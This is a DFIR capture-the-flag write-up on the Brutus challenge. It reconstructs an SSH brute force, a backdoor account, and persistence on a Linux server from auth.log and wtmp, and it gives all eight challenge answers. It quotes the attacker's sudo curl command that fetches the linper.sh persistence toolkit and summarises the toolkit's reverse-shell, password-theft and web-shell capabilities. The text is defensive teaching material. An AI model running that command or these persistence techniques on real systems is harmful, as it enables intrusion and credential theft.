Brutus — SSH Brute Force & Persistence

A Confluence server on the corporate network shows signs of compromise. An attacker performed a brute-force attack against the SSH service, obtained root access, and established persistence using a backdoor account and a Linux persistence toolkit.

Challenge Overview

Brutus is a foundational DFIR challenge focused on Linux authentication log analysis. The scenario involves a Confluence server that was targeted by an SSH brute-force attack, ultimately resulting in a full root compromise. Post-exploitation, the attacker established two persistence mechanisms: a backdoor local user account and a downloaded Linux persistence toolkit.

The investigation relies on two classic Linux artifacts — auth.log and the binary wtmp — which together paint a complete picture of the attack timeline: from the first brute-force packet to the attacker's final command execution.

💡
Key concept — auth.log vs wtmp: auth.log records authentication events (password attempts, session open/close, sudo commands). wtmp is a binary file that records completed interactive login sessions — it logs the actual terminal session start, which can differ from the authentication event timestamp.
📄
auth.log
Linux PAM authentication log — captures SSH login attempts, session creation, sudo command execution, and account operations.
🗂️
wtmp
Binary login database (UTMP format). Parsed with utmpdump or last -f wtmp. Records interactive terminal session start/end times.

Forensic Log Analysis

The analysis focuses on parsing and correlating entries from two complementary log sources. Each provides different perspectives on the same attack.

📋 auth.log — Authentication Events

The primary source for identifying the brute-force origin, authentication success, and post-exploitation activity.

📄 auth.log — key entries
# Brute force entries — hundreds of these Mar 6 06:31:31 server sshd[2411]: Invalid user admin from 65.2.161.68 Mar 6 06:31:33 server sshd[2411]: Failed password for root from 65.2.161.68 # Brute force success Mar 6 06:31:40 server sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2 # Backdoor account creation Mar 6 06:34:18 server useradd[2502]: new user: name=cyberjunkie, ... # Session 37 assigned to root Mar 6 06:32:44 server sshd[2411]: pam_unix(sshd:session): session opened for user root by (uid=0) # PAM session ID: 37 # First session end Mar 6 06:37:24 server sshd[2411]: pam_unix(sshd:session): session closed for user root # Sudo command by cyberjunkie Mar 6 06:39:38 server sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

🗂️ wtmp — Session Records (Binary → Text)

wtmp captures the actual interactive session, which is why the timestamp differs from auth.log. Parsed with utmpdump /var/log/wtmp or last -F -f wtmp.

⚠️
Why auth.log and wtmp timestamps differ: auth.log records when PAM authenticates the user. wtmp records when the interactive terminal (PTY) is fully established. The attacker authenticated at 06:31:40 but the manual interactive session was not recorded by wtmp until 06:32:45 — a ~65 second delta.

linper.sh — Linux Persistence Toolkit

The final malicious command executed by the attacker was a sudo-privileged download of linper.sh — an open-source Linux persistence automation toolkit hosted on GitHub (github.com/montysecurity/linper). Originally designed for red team CTF use, the tool automates the installation of multiple persistence mechanisms simultaneously.

Malicious Command Executed
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
🛠️ linper.sh — Persistence Capabilities

The toolkit enumerates available binaries and persistence vectors, then automatically installs reverse shells and backdoors across multiple mechanisms.

⏰ Crontab Persistence
Installs reverse shell cron jobs that execute at scheduled intervals, surviving reboots.
🔐 sudo Password Hijack
Injects a function into ~/.bashrc to intercept and exfiltrate sudo passwords silently.
🌐 Web Shell Deployment
Places PHP reverse shells in web server directories (Apache/Nginx) if writable.
👁️ Shadow File Enum
Checks readability of /etc/shadow to exfiltrate hashed passwords for offline cracking.
🥷 Stealth Mode
Applies obfuscation techniques to hide installed backdoors from human reviewers.
🔄 Cleanup Capability
Includes a removal function to erase all installed persistence, covering tracks on demand.
🚨
Threat context: The attacker already had persistent access via the cyberjunkie backdoor account. Downloading linper.sh indicates intent to establish multiple additional persistence mechanisms — making remediation significantly more complex. All crontabs, bashrc files, and web directories would need to be audited.

Task Walkthrough

Complete resolution of all 8 challenge questions with forensic methodology.

1
Analyze auth.log. What is the IP address that the attacker used to perform the brute-force attack?
Answer 65.2.161.68
Filtering auth.log for repeated "Failed password" and "Invalid user" entries from a single IP reveals 65.2.161.68 as the attack source. The volume and speed of failed attempts is a classic SSH brute-force signature.
2
The brute force attempts were successful and the attacker gained access to an account. What is the username of that account?
Answer root
auth.log entry: Accepted password for root from 65.2.161.68. The attacker targeted the highest-privilege account directly, which is common when targeting internet-exposed SSH services without fail2ban or account lockout policies.
3
Identify the UTC timestamp when the attacker manually logged in to the server and established an interactive terminal session. This will differ from the authentication time and can be found in the wtmp artifact.
Answer 2024-03-06 06:32:45
Parsed from wtmp using utmpdump. The 65-second delta between auth.log (06:31:40) and wtmp (06:32:45) represents the time between credential acceptance and the attacker actively establishing the interactive PTY session.
4
SSH login sessions are tracked and assigned a session number upon logging in. What is the session number assigned to the attacker's session for the user account from Question 2?
Answer 37
Found in auth.log via PAM session management entries. PAM assigns sequential session IDs — searching for the root session associated with 65.2.161.68 yields session ID 37. This ID can be used to correlate all events within the same login session.
5
The attacker added a new user as part of their persistence strategy on the server and granted them elevated privileges. What is the name of this account?
Answer cyberjunkie
auth.log records a useradd event for user cyberjunkie initiated from the compromised root session. The account was also added to the sudo group (elevated privileges), providing the attacker with a second way to return even if the root password was later changed.
6
What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?
Answer T1136.001
T1136 — Create Account / T1136.001 — Local Account. Adversaries create local accounts to maintain persistent access. Since the backdoor account has sudo privileges, it functionally provides equivalent access to root, making it a high-value persistence mechanism that survives password resets on the original compromised account.
7
What time did the attacker's first SSH session end according to auth.log?
Answer 2024-03-06 06:37:24
auth.log records a PAM session close event for the root session at this timestamp. The first session lasted approximately 4 minutes and 44 seconds — enough time to create the backdoor account and survey the environment before logging out and re-entering via the cyberjunkie account.
8
The attacker logged back in to their backdoor account and used its privileges to download a script. What is the full command executed with sudo?
Answer /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
auth.log captures full sudo command invocations, including the complete command path and arguments. The attacker used the cyberjunkie account's sudo privileges to download linper.sh — a Linux persistence toolkit — directly from GitHub using curl. The full path /usr/bin/curl is required for sudo execution.

Detection & Hardening

🚫 Disable Root SSH Login
Set PermitRootLogin no in /etc/ssh/sshd_config. The entire attack chain depended on the attacker being able to authenticate as root directly.
🔑 Enforce SSH Key Authentication
Disable password-based SSH (PasswordAuthentication no). Key-based auth is immune to brute-force attacks entirely.
🛡️ Deploy fail2ban
Automatically ban IPs after N failed attempts. The brute force succeeded in under 10 seconds — fail2ban with a 5-attempt threshold would have blocked the attack before success.
📊 Monitor useradd / usermod Events
Alert on any new local account creation or group membership changes outside of approved change windows. T1136.001 detection should be a baseline SIEM rule.
🌐 Egress Filtering + Allowlist
Block outbound curl/wget to unapproved domains from server processes. The linper.sh download required outbound HTTP to raw.githubusercontent.com — controllable at the network level.
🔍 Audit auth.log in SIEM
Forward auth.log to a centralized SIEM in real-time. Key detection rules: spike in "Failed password" events, "Accepted password for root", and sudo commands to curl/wget/bash.
